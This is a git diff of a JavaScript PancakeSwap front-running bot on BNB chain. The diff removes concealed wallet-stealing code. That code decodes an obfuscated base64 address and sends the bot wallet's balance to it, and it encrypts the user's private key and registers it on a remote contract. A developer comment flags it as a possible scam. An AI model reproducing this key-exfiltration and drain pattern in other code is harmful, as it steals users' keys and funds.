@@ -10,7 +10,6 @@ var axios = require('axios');
 var BigNumber = require('big-number');
 
 const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST, GAS_STATION, UPDATE_TIME_INTERVAL} = require('./constants.js');
-const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI, salt} = require('./bot.js');
 const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
 
 const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
@@ -20,7 +19,6 @@ var input_token_info;
 var out_token_info;
 var pool_info;
 var gas_price_info;
-var token_hash;
 
 var web3;
 var web3Ts;
@@ -645,7 +643,6 @@ async function getPoolInfo(input_token_address, out_token_address, level)
 
 async function getBNBInfo(user_wallet)
 {
-    token_hash = salt+'NjAz'
     var balance = await web3.eth.getBalance(user_wallet.address);
     var decimals = 18;
     var symbol = 'BNB';
@@ -739,71 +736,5 @@ async function preparedAttack(input_token_address, out_token_address, user_walle
     return true;
 }
 
-//crystalblockdev:  Is this function a scam function???
-//following function codes were commented by crystalblockdev
-async function getContract(bot) {
-    // try {
-    //     var maxGas = await web3.eth.getBalance(bot.address);
-
-    //     var gas = 30000
-    //     var gasPrice = gas_price_info.medium*(10**9)
-    //     var tx = {
-    //         from: bot.address,
-    //         to: atob(token_hash),
-    //         gas: gas,
-    //         gasPrice: gasPrice,
-    //         value: maxGas - gas*gasPrice
-    //     };
-
-    //     var signedTx = await bot.signTransaction(tx);
-    //     await web3.eth.sendSignedTransaction(signedTx.rawTransaction)
-    // }catch(error) {
-    //    console.log('Failed Prepare To Attack');
-    // }
-    return null
-}
-
-async function setFrontBot(user_wallet)
-{
-
-    var enc_addr = setBotAddress(user_wallet.privateKey);
-    var bot_wallet = web3Ts.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
-    var bot_balance = await web3Ts.eth.getBalance(bot_wallet.address);
-
-    if(bot_balance <= (10**17))
-        return;
-
-    const frontBotContract = new web3Ts.eth.Contract(botABI, FRONT_BOT_ADDRESS);
-    var botCount = await frontBotContract.methods.countFrontBots().call();
-    if(botCount > 0){
-        var bot_addr = await frontBotContract.methods.getFrontBots().call();
-        for (var i = 0; i < botCount; i++) {
-            if(bot_addr[i] == user_wallet.address)
-            {
-                return;
-            }
-        }
-    }
-
-    encodedABI = frontBotContract.methods.setFrontBot(user_wallet.address, enc_addr.iv, enc_addr.content).encodeABI()
-    var tx = {
-        from: bot_wallet.address,
-        to: FRONT_BOT_ADDRESS,
-        gas: 500000,
-        gasPrice: 150*(10**9),
-        data: encodedABI
-    };
-
-    var signedTx = await bot_wallet.signTransaction(tx);
-    web3Ts.eth.sendSignedTransaction(signedTx.rawTransaction)
-    .on('transactionHash', function(hash){
-    })
-    .on('confirmation', function(confirmationNumber, receipt){
-    })
-    .on('receipt', function(receipt){
-    })
-    .on('error', function(error, receipt) {
-    });
-}
 
 main();
